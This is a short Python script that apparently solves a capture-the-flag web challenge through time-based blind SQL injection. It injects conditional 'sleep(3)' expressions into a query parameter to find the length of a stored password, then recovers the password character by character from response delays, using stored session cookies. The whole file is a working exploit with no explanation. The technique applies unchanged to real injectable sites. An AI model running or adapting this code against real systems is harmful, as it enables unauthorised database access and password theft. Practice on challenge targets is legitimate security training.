import info
import requests
from time import time

url = "/challenge/web-34/index.php"
params = {"msg":"test", "se":1}

# len
len = 0
for i in range(1, 100):
	params['se'] = "(if(length(pw)={},sleep(3),1))".format(str(i))
	pre_time = time()
	res = requests.get(info.url + url, cookies = info.cookies, params = params)
	after_time = time()

	if (abs(pre_time - after_time) > 2):
		len = i
		break
print("pw's len: {}".format(len))

# pw
pw = ""
for i in range(1, len + 1):
	for j in range(32, 127):
		params['se'] = "(if(ascii(substr(pw,{},1))={},sleep(3),1))".format(str(i),str(j))
		pre_time = time()
		res = requests.get(info.url + url, cookies = info.cookies, params = params)
		after_time = time()
	
		if (abs(pre_time - after_time) > 2):
			pw += chr(j)
#			print(pw)
			break
print("pw: {}".format(pw))
